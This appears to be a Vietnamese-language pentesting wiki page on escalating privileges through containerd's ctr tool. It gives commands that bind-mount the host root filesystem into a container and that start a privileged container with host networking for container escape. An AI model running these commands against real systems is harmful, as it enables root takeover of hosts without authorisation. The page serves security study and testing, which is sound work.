# Leo thang đặc quyền Containerd (ctr)

{{#include ../../banners/hacktricks-training.md}}

## Thông tin cơ bản

Truy cập liên kết sau để tìm hiểu **`containerd` và `ctr` nằm ở đâu trong ngăn xếp container**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Nếu phát hiện máy chủ có lệnh `ctr`, CLI gốc đi kèm với containerd:<sup>[[1]](#references)</sup>

```bash
which ctr
/usr/bin/ctr
```

Bạn có thể liệt kê các image mà containerd nhận biết:<sup>[[2]](#references)</sup>

```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```

Sau đó **chạy một trong các image đó với thư mục gốc của host được bind-mount đệ quy vào thư mục gốc của container**:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```

## PE 2

Chạy một container ở chế độ privileged và kiểm tra khả năng escape.\
Bạn có thể chạy một container ở chế độ privileged bằng mạng host như sau:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```

`--privileged` cấp cho process các Linux capabilities hiệu lực của caller và loại bỏ một số biện pháp kiểm soát cách ly, nhưng escape vẫn phụ thuộc vào môi trường; hãy dùng các kỹ thuật được đề cập trong trang sau để kiểm tra:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Bắt đầu với containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Triển khai lệnh ctr image](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Triển khai lệnh ctr run](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Tài liệu về shared-subtree của Linux kernel](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [Gói OCI của containerd: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Các cờ lệnh `ctr` của containerd](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
